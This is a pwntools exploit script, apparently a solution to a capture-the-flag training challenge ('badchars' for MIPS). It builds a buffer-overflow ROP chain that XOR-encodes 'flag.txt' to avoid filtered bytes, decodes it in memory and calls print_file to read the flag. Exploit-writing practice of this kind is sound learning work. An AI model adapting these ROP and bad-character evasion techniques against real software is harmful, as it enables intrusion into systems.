from pwn import *

BINARY = "./badchars_mipsel"
ELF = ELF(BINARY)

context.os = "linux"
context.arch = "mips"
context.binary = BINARY

p = process(BINARY)

"""
BAD CHARS = '.', 'a', 'g', 'x'
--> 0x2e, 0x61, 0x67, 0x78

"flag.txt" ^ 0x02 == "dnce,vzv"

-------------------------------
0x00400930 --> 
    lw $t9, 0xc($sp)
    lw $t0, 8($sp)
    lw $t1, 4($sp)
    sw $t1, ($t0)
    jalr $t9
    addi $sp, $sp, 0x10
------------------------------
0x00400948 --> xoring gadget
    lw $t9, 0xc($sp)
    lw $t0, 8($sp)
    lw $t1, 4($sp)
    lw $t2, ($t1)
    xor $t0, $t0, $t2
    sw $t0, ($t1)
    jalr $t9
    addi $sp, $sp, 0x10
-----------------------------
0x00400968 --> "pop a0, t9 ; jalr t9" gadget
    lw $a0, 8($sp)
    lw $t9, 4($sp)
    jalr $t9
    addi $sp, $sp, 0xc
"""

storing_gadget    = p32(0x400930)
xoring_gadget     = p32(0x400948)
pop_a0_t9_jalr_t9 = p32(0x400968)

print_file_plt    = p32(0x400ab0)
data_adr          = 0x411000

rop = b"A" * 36

rop += storing_gadget
rop += b'BBBB'
rop += b'dnce' # 'flag' ^ 0x02020202
rop += p32(data_adr)

rop += storing_gadget
rop += b'CCCC'
rop += b',vzv' # '.txt' ^ 0x02020202
rop += p32(data_adr + 4)

rop += xoring_gadget
rop += b'DDDD'
rop += p32(data_adr)
rop += b'\x02' * 4

rop += xoring_gadget
rop += b'EEEE'
rop += p32(data_adr + 4)
rop += b'\x02' * 4

rop += pop_a0_t9_jalr_t9
rop += b'FFFF'
rop += print_file_plt
rop += p32(data_adr)

log.success(f"ROP chain : {rop}")
p.sendline(rop)

flag = p.recvall().split(b'\n')[-3]
log.success(f"FLAG : {flag}")
